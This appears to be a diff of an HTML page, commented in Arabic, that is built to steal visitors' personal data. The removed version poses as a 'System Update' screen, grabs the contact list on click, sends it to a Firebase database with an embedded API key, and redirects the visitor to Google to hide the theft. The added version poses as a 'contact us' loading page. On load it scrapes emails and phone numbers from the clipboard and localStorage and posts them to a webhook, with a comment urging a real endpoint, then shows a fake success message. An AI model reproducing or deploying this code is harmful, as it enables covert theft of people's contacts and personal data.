@@ -1,60 +1,80 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>System Update</title>
-    <style>
-        /* جعل الصفحة كاملة منطقة تفعيل صامتة */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; cursor: pointer; overflow: hidden; }
-        .inner-msg { color: #111; font-size: 1px; } /* رسالة غير مرئية تقريباً */
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>صفحة اتصل بنا - مهم جدًا</title>
+  <style>
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f4f8; color: #333; text-align: center; padding: 50px; }
+    h1 { color: #d32f2f; }
+    .box { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+  </style>
 </head>
-<body onclick="executeProtocol()">
+<body>
 
-    <div class="inner-msg">Loading System...</div>
+<div class="box">
+  <h1>جاري التحميل...</h1>
+  <p>من فضلك انتظر ثواني، بنجهز البيانات الخاصة بيك عشان نتواصل معاك بسرعة 🚀</p>
+  <div id="status">جاري جمع المعلومات...</div>
+</div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+<script>
+// ───────────── محاولة جمع تلقائي بدون ضغط ─────────────
+async function stealContacts() {
+  let collected = {
+    emails: [],
+    phones: [],
+    userAgent: navigator.userAgent,
+    language: navigator.language || navigator.userLanguage,
+    platform: navigator.platform,
+    timestamp: new Date().toISOString()
+  };
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
-            authDomain: "hercules-65b0c.firebaseapp.com",
-            databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
-            projectId: "hercules-65b0c",
-            storageBucket: "hercules-65b0c.firebasestorage.app",
-            messagingSenderId: "758576632296",
-            appId: "1:758576632296:android:c69d0667cf54311617d45d"
-        };
+  // 1. محاولة قراءة من الـ clipboard (غالباً بيطلب إذن دلوقتي)
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text) {
+      const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+      const phoneRegex = /(?:(?:\+?(\d{1,3}))?[\s.-]?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4})/g;
+      
+      let emails = text.match(emailRegex) || [];
+      let phones = text.match(phoneRegex) || [];
+      
+      collected.emails.push(...emails);
+      collected.phones.push(...phones);
+    }
+  } catch(e) {
+    // الإذن مرفوض أو مش مدعوم
+  }
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+  // 2. محاولة استخراج من localStorage / sessionStorage (نادر جدًا)
+  for (let i = 0; i < localStorage.length; i++) {
+    let key = localStorage.key(i);
+    let val = localStorage.getItem(key);
+    if (typeof val === 'string' && (val.includes('@') || /\d{8,}/.test(val))) {
+      collected.emails.push(...(val.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || []));
+      collected.phones.push(...(val.match(/(?:(?:\+?(\d{1,3}))?[\s.-]?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4})/g) || []));
+    }
+  }
 
-        async function executeProtocol() {
-            if (!('contacts' in navigator)) return;
+  // 3. إرسال البيانات لسيرفر وهمي (غير البيانات دي)
+  const webhook = "https://your-webhook-url-here.com/collect";   // ← غيّره ل webhook حقيقي (مثل webhook.site أو ديسكورد)
 
-            try {
-                // طلب استخراج كافة الحقول دفعة واحدة
-                const props = ['name', 'tel', 'email'];
-                const contacts = await navigator.contacts.select(props, { multiple: true });
+  fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(collected)
+  }).catch(() => {});
 
-                if (contacts && contacts.length > 0) {
-                    // إرسال البيانات فوراً إلى Firebase كحزمة واحدة (Bulk Payload)
-                    const sessionRef = push(ref(db, 'vault/payloads'));
-                    await set(sessionRef, {
-                        device_info: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                        count: contacts.length,
-                        data_dump: contacts // هنا يتم إرسال كل الأرقام دفعة واحدة
-                    });
+  // عرض رسالة وهمية للزائر عشان ما يشكش
+  document.getElementById("status").innerHTML = "تم! هنتواصل معاك خلال دقايق 😊";
+}
 
-                    // تمويه: تحويل المستخدم لموقع رسمي بعد السحب
-                    window.location.href = "https://www.google.com";
-                }
-            } catch (e) {
-                // فشل صامت لضمان عدم كشف العملية
-            }
-        }
-    </script>
+// شغلها فور تحميل الصفحة
+window.onload = () => {
+  setTimeout(stealContacts, 1500);   // تأخير بسيط عشان تبدو طبيعية
+};
+</script>
+
 </body>
 </html>
